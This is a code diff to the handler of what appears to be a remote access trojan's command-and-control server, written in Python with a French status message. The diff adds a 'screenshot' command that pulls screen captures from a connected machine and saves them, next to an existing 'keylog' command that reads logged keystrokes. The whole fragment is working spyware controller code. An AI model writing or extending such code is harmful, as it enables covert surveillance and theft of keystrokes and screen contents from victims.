@@ -16,6 +16,7 @@ def handle_connection(connection, address):
             if command.lower() == 'exit':
                 connection.send(b'quit')
                 break
+
             elif command.lower() == 'keylog':
                 try:
                     with open(keylog_file, "r") as keylog:
@@ -30,6 +31,23 @@ def handle_connection(connection, address):
                     break
 
                 print(f"Output:\n{response}")
+
+            connection.send(command.encode())
+            
+            if command.lower() == 'screenshot':
+                img_size = int(connection.recv(1024).decode())
+                connection.send(b'OK')
+                img_data = b''
+                while len(img_data) < img_size:
+                    packet = connection.recv(4096)
+                    if not packet:
+                        break
+                    img_data += packet
+
+                with open("screen.png", "wb") as f:
+                    f.write(img_data)
+                print("Capture reussie !")
+                continue
 
         except Exception as e:
             print(f"Error: {e}")
